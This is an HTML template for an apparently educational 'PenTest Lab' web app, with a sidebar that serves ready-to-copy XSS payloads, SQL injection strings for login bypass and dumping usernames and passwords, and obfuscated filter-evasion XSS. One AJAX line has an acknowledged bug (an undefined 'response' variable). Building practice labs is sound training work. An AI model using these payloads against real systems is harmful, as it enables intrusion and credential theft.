<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>PenTest Lab</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; padding-top: 60px; background-color: #ecf0f1; transition: margin-left .3s; }
        .btn { padding: 10px 20px; border-radius: 5px; color: white; border: none; cursor: pointer; font-weight: bold; font-size: 14px; display: inline-block; text-decoration: none; box-sizing: border-box; }
        .btn:hover { opacity: 0.9; }
        .btn-full { width: 100%; display: block; margin-top: 5px; text-align: center; }
        .btn-red { background-color: #e74c3c; } .btn-green { background-color: #27ae60; } .btn-blue { background-color: #3498db; } 
        .btn-orange { background-color: #e67e22; } .btn-purple { background-color: #8e44ad; } .btn-gray { background: #7f8c8d; }
        
        .menu-btn { position: fixed; top: 15px; left: 15px; z-index: 2000; background: #2c3e50; color: white; padding: 12px 20px; border-radius: 5px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.3); border:none; cursor: pointer; }
        .sidebar { height: 100%; width: 0; position: fixed; top: 0; left: 0; z-index: 2001; background: #2c3e50; transition: 0.3s; color: white; box-shadow: 4px 0 10px rgba(0,0,0,0.5); overflow-y: auto; overflow-x: hidden; white-space: nowrap; visibility: hidden; }
        .sidebar.open { width: 350px; visibility: visible; }
        
        .profile-card { background: #1a252f; padding: 30px; text-align: center; border-bottom: 1px solid #34495e; position: relative; }
        .closebtn { position: absolute; top: 10px; right: 15px; font-size: 30px; color: #7f8c8d; cursor: pointer; text-decoration: none; }
        
        .sidebar-section { padding: 20px; border-bottom: 1px solid #34495e; }
        .sidebar h3 { margin-top: 0; color: #95a5a6; font-size: 14px; text-transform: uppercase; }
        .sidebar-select { width: 100%; padding: 10px; background: #34495e; color: white; border: 1px solid #2c3e50; border-radius: 4px; margin-bottom: 10px; outline: none; cursor: pointer; }
        .code-preview { width: 100%; height: 120px; background: #000; color: #0f0; border: 1px solid #333; font-family: monospace; padding: 10px; box-sizing: border-box; resize: vertical; font-size: 11px; margin-bottom: 10px; white-space: pre-wrap; }

        .top-bar { display: flex; justify-content: flex-end; margin-bottom: 20px; }
        .box { background: white; padding: 25px; border-radius: 8px; margin-bottom: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); position: relative; }
        
        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; pointer-events: none; }
        .toast { min-width: 250px; margin-bottom: 10px; background: #333; color: #fff; padding: 15px; border-radius: 5px; opacity: 0; transition: 0.5s; transform: translateY(-20px); }
        .toast.show { opacity: 1; transform: translateY(0); }
        
        /* UI Helpers */
        .dash-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .dash-card { background: white; padding: 30px; border-radius: 10px; text-align: center; border-top: 5px solid #bdc3c7; display: flex; flex-direction: column; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .dash-card h2 { margin-top: 0; }
        select.form-select { display: block; width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 4px; margin-bottom: 10px; cursor: pointer; background: white; color: black; appearance: auto; z-index: 10; position: relative; }
        .nav-header { background-color: #34495e; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .file-rules { padding: 10px; margin: 10px 0; border-radius: 5px; font-size: 14px; font-weight: bold; display: block; text-align: center;}
        .rules-danger { background-color: #fadbd8; color: #c0392b; border: 1px solid #e6b0aa; }
        .rules-success { background-color: #d4efdf; color: #1e8449; border: 1px solid #a9dfbf; }
        .separator { margin: 20px 0; border-top: 1px dashed #ccc; position: relative; text-align: center; }
        .separator span { background: #fff; padding: 0 10px; position: relative; top: -12px; color: #7f8c8d; font-size: 12px; font-weight: bold;}
    </style>
</head>
<body>
    <div id="toast-container"></div>
    
    {% if request.endpoint != 'dashboard' %}
        <button class="menu-btn" id="menuBtn" onclick="openNav()">‚ò∞ HACKER MENU</button>
    {% endif %}

    <div id="mySidebar" class="sidebar">
        <div class="profile-card">
            <a class="closebtn" onclick="closeNav()">&times;</a>
            <div style="font-size: 40px;">üë§</div>
            <div><b>{{ session.username }}</b></div>
            <div style="color: #3498db; font-size: 12px;">[{{ session.role }}]</div>
            <a href="/logout" class="btn btn-red btn-full">üö™ LOGOUT</a>
        </div>

        <div class="sidebar-section">
            <h3>üõ†Ô∏è NAVIGATION</h3>
            <select id="tools-select" class="sidebar-select">
                <option value="/dashboard">üè† DASHBOARD</option>
                <option value="/">üí¨ XSS LAB</option>
                <option value="/sqli">üíâ SQL INJECTION</option>
                <option value="/stealth">üõ°Ô∏è EVASION LAB</option>
            </select>
            <button class="btn btn-purple btn-full" onclick="openTool()">GO TO PAGE</button>
        </div>

        <div class="sidebar-section" id="payload-section">
            <h3>üí£ PAYLOADS</h3>
            <select id="payload-select" class="sidebar-select"></select>
            <textarea id="payload-preview" class="code-preview" readonly></textarea>
            <button class="btn btn-green btn-full" onclick="copyFromPreview()">COPY PAYLOAD üìã</button>
        </div>
        <div style="height: 100px;"></div>
    </div>

    <div id="main">
        <div class="top-bar">
            {% if session.get('username') %}
                <form action="/reset_db" method="post" style="display:inline;" class="ajax-form">
                    <button type="submit" class="btn btn-red" style="font-size: 12px;">üóëÔ∏è CLEAN DB</button>
                </form>
            {% endif %}
        </div>
        {% block content %}{% endblock %}
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        const PAYLOADS_DB = {
            '/': {
                "1. Alert": "<script>alert('XSS')<\/script>",
                "2. Cookie": "<script>alert(document.cookie)<\/script>",
                "3. Redirect": "<script>window.location='http://google.com'<\/script>",
                "4. Matrix": "<script>window.location='http://matrixscreensaver.online'<\/script>"
            },
            '/sqli': {
                "1. Bypass": "' OR '1'='1",
                "2. Union Test": "' UNION SELECT 1, 'text', 'text' --",
                "3. DB Version": "' UNION SELECT 1, version(), 'info' --",
                "4. Users": "' UNION SELECT 1, username, 'user' FROM users --",
                "5. Passwords": "' UNION SELECT id, username, password FROM users --"
            },
            '/stealth': {
                "1. Brain-Melt": "<svg/id=\"x\" on\&#108;oad=\"[].sort.constructor('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')()\">",
                "2. JJEncode": "$=~[];$={___:++$,$$$$:(![]+\"\")[$]};$.$($.$($.$$+\"\\\"\")())();",
                "3. Base64": "<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>"
            }
        };

        // --- INIT MENU ---
        const path = window.location.pathname;
        const payloadSection = document.getElementById('payload-section');
        const payloadSelect = document.getElementById('payload-select');
        const toolsSelect = document.getElementById('tools-select');

        // Load Payloads
        let currentPayloads = PAYLOADS_DB[path] || {};
        if (Object.keys(currentPayloads).length === 0) {
            if (payloadSection) payloadSection.style.display = 'none';
        } else {
            for (const [name, code] of Object.entries(currentPayloads)) {
                let option = document.createElement('option');
                option.value = name; option.text = name;
                payloadSelect.appendChild(option);
            }
            // Restore selection
            const savedKey = 'lastPayload_' + path;
            const savedVal = localStorage.getItem(savedKey);
            if (savedVal && currentPayloads[savedVal]) payloadSelect.value = savedVal;
            
            updatePreview();
            payloadSelect.addEventListener('change', () => {
                localStorage.setItem(savedKey, payloadSelect.value);
                updatePreview();
            });
        }

        // Restore Tool
        const savedTool = localStorage.getItem('lastTool');
        if (savedTool && [...toolsSelect.options].some(o => o.value === savedTool)) {
            toolsSelect.value = savedTool;
        }
        toolsSelect.addEventListener('change', () => localStorage.setItem('lastTool', toolsSelect.value));

        // --- GLOBAL FUNCTIONS ---
        window.openNav = function() { document.getElementById("mySidebar").classList.add('open'); if(payloadSelect) updatePreview(); }
        window.closeNav = function() { document.getElementById("mySidebar").classList.remove('open'); }
        window.openTool = function() { window.location.href = toolsSelect.value; }
        window.copyFromPreview = function() {
            const ta = document.getElementById('payload-preview');
            if(ta) {
                ta.select(); document.execCommand('copy');
            }
        }

        function updatePreview() {
            if(payloadSelect && payloadSelect.selectedIndex !== -1) {
                const key = payloadSelect.options[payloadSelect.selectedIndex].value;
                document.getElementById('payload-preview').value = currentPayloads[key];
            }
        }

        document.addEventListener('click', function(e) {
            const sb = document.getElementById('mySidebar');
            const btn = document.getElementById('menuBtn');
            if (sb.classList.contains('open') && !sb.contains(e.target) && (!btn || !btn.contains(e.target))) {
                closeNav();
            }
        });

        // --- AJAX ---
        document.querySelectorAll('.ajax-form').forEach(form => {
            form.onsubmit = async (e) => {
                e.preventDefault();
                const fd = new FormData(form);
                try {
                    const res = await fetch(form.getAttribute('action'), { method: 'POST', body: fd, headers: { 'X-Requested-With': 'XMLHttpRequest' } });
                    if (res.ok) {
                        const data = await response.json(); // –¢–£–¢ –ë–£–õ–ê –ü–û–ú–ò–õ–ö–ê 'response' -> 'res'
                        showToast(data.message, data.status);
                        if (data.status === 'success' && form.getAttribute('action') === '/') form.reset();
                    }
                } catch(e) {}
            };
        });

        function showToast(msg, type) {
            const t = document.createElement('div'); t.className = `toast ${type}`; t.innerText = msg;
            document.getElementById('toast-container').appendChild(t);
            setTimeout(() => t.classList.add('show'), 100);
            setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 500); }, 3000);
        }

        // DB Check
        let currentVersion = null;
        setInterval(async () => {
            try {
                const res = await fetch('/check_db_version');
                const data = await res.json();
                if (currentVersion === null) currentVersion = data.version;
                else if (currentVersion !== data.version) {
                    if (location.pathname.includes('/vulnerable') || location.pathname.includes('/secure')) location.reload();
                    else showToast('DB Cleared', 'info');
                    currentVersion = data.version;
                }
            } catch (e) {}
        }, 1000);
    });
    </script>
</body>
</html>